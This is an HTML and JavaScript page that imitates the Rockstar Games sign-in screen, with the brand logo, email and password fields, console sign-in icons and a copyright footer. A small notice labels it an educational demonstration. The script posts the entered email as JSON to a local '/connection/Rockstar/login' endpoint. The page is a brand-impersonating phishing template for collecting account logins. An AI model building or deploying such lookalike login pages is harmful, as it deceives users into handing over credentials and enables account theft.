
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rockstar Games — Educational Demo</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            background: #101010;
            color: white;
            font-family: Arial, sans-serif;
        }

        .page {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 70px 20px 25px;
        }

        .logo {
            font-size: 85px;
            font-weight: 900;
            font-style: italic;
            margin-bottom: 30px;
        }

        .card {
            width: 550px;
            max-width: 100%;
            background: white;
            color: #111;
            padding: 30px;
            border-radius: 5px;
        }

        h1 {
            margin: 0 0 20px;
            font-size: 27px;
        }

        .notice {
            font-size: 13px;
            color: #666;
            margin-bottom: 20px;
        }

        .field {
            display: block;
            width: 100%;
            height: 60px;
            padding: 15px 18px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 17px;
        }

        .remember {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
        }

        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 15px;
            margin-top: 25px;
        }

        .forgot {
            font-size: 14px;
            color: #555;
        }

        .button {
            background: #ffb51b;
            color: #111;
            border: none;
            padding: 14px 28px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .button:hover {
            background: #f5a000;
        }

        .social {
            width: 550px;
            max-width: 100%;
            background: white;
            color: #333;
            margin-top: 20px;
            padding: 22px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 5px;
        }

        .icons {
            display: flex;
            gap: 12px;
        }

        .icon {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-weight: bold;
        }

        .ps {
            background: #009cde;
        }

        .xbox {
            background: #168a20;
        }

        .register {
            margin-top: 30px;
            text-align: center;
            font-size: 14px;
        }

        .register span {
            color: #ffb51b;
        }

        footer {
            margin-top: auto;
            padding-top: 60px;
            text-align: center;
            color: #999;
            font-size: 12px;
        }

        @media (max-width: 500px) {
            .actions {
                flex-direction: column;
                align-items: stretch;
            }

            .button {
                width: 100%;
            }
        }
    </style>
</head>

<body>

<div class="page">

    <div class="logo">R☆</div>

    <div class="card">
        <h1>Sign In</h1>

        <p class="notice">
            Educational demonstration. Do not enter real account credentials.
        </p>

        <input
                id="login"
                class="field"
                type="text"
                placeholder="Email"
                autocomplete="off"
        >

        <input
                id="password"
                class="field"
                type="password"
                placeholder="Password"
                autocomplete="off"
        >

        <label class="remember">
            <input type="checkbox">
            Keep me signed in
        </label>

        <div class="actions">
            <span class="forgot">Forgot your password?</span>

            <button
                    class="button"
                    type="button"
                    onclick="sendDemo()"
            >
                Sign in
            </button>
        </div>
    </div>

    <div class="social">
        <span>Sign in using</span>

        <div class="icons">
            <div class="icon ps">PS</div>
            <div class="icon xbox">X</div>
        </div>
    </div>

    <div class="register">
        Don't have a Rockstar Games account?
        <span>Create a new account</span>
    </div>

    <footer>
        © 2026 ROCKSTAR GAMES |
        EDUCATIONAL DEMONSTRATION
    </footer>

</div>

<script>
    async function sendDemo() {
        const login = document.getElementById("login").value;

        if (login.trim() === "") {
            alert("Введите логин");
            return;
        }

        try {
            const response = await fetch(
                "/connection/Rockstar/login",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        login: login
                    })
                }
            );

            if (response.ok) {
                alert("Запрос успешно отправлен");
            } else {
                alert("Ошибка сервера: " + response.status);
            }
        } catch (error) {
            console.error(error);
            alert("Не удалось подключиться к серверу");
        }
    }
</script>

</body>
</html>
